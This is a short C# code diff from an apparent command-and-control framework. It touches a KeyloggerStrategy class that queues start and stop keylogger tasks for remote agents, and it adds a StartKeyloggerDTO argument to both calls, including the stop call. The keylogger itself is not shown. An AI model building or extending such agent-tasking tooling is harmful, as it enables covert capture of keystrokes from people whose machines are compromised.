@@ -1,3 +1,4 @@
+using Trinity.Shared.DTOs.Command;
 using Trinity.Shared.Errors;
 using Trinity.Shared.Interfaces;
 using Trinity.Shared.Results;
@@ -20,13 +21,13 @@ public class KeyloggerStrategy : ICommandStrategy
 
         if (sub == "start")
         {
-            var task = await _client.QueueStartKeyloggerCommandAsync(agentID);
+            var task = await _client.QueueStartKeyloggerCommandAsync(agentID, new StartKeyloggerDTO());
             return $"Tasked agent to start keylogger #{task}";
         }
 
         if (sub == "stop")
         {
-            var task = await _client.QueueStopKeyloggerCommandAsync(agentID);
+            var task = await _client.QueueStopKeyloggerCommandAsync(agentID, new StartKeyloggerDTO());
             return $"Tasked agent to stop keylogger #{task}";
         }
 
